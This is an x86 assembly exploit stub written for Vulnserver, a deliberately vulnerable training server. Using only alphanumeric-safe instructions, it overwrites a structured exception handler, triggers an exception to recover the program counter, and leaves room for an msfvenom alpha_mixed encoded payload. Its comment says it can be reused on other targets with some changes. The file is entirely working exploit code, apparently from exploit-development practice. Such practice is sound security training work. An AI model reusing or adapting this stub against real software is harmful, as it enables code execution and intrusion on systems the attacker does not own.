bits 32

; Works on Vulnserver can be reused on other targets with some changes.

; Generate address 0x625011e3 pop ecx # pop edx # ret
; to overwrite SEH
push esi
push esp
pop eax
xor esi, dword ptr ss:[eax]
push esi
pop eax
sub eax, 0x3846795f
sub eax, 0x27464d40
sub eax, 0x3e23277e
push eax
pop ebx

; Generates push [edx +4];ret to overwrite next SEH
; Here edx should be changed depending on what's the second pop from SEH overwrite
push esi
pop eax
sub eax, 0x7c4e232b
sub eax, 0x4c274176
sub eax, 0x747e2860
; eax = push [edx +12];ret
; ebx = 0x625011e3
; esi = 0x00000000


; Overwrite SEH handler
xor esi, dword ptr fs:[esi]; esi points to handler
push esi
push eax
pop esi
pop eax
xor esi, dword ptr ds:[eax]
xor dword ptr ds:[eax],esi
inc eax
inc eax
inc eax
inc eax
push ebx
pop esi
xor esi, dword ptr ds:[eax]
xor dword ptr ds:[eax],esi

; Trigger exception
push 0x30
pop ecx
cmp byte ptr[ecx],ch ; CAREFUL, when it returns from exception should not trigger the exception again

; Get PC from stack into last pop (eax in this case)
pop eax
push esp
pop eax
sub eax, 0x7e4f7a6f
sub eax, 0x28652b2c
sub eax, 0x594b5a6d
push eax
pop esp
pop eax

; Adjust instruction after pop ecx to be 8 bytes away from our obtained PC
sub eax,0x7e6f6f6f
sub eax,0x2d686f38
sub eax,0x54282139
push eax
pop ecx

; Here append msfvenom -e x86/alpha_mixed when the DEC ECX start (IIIIII...)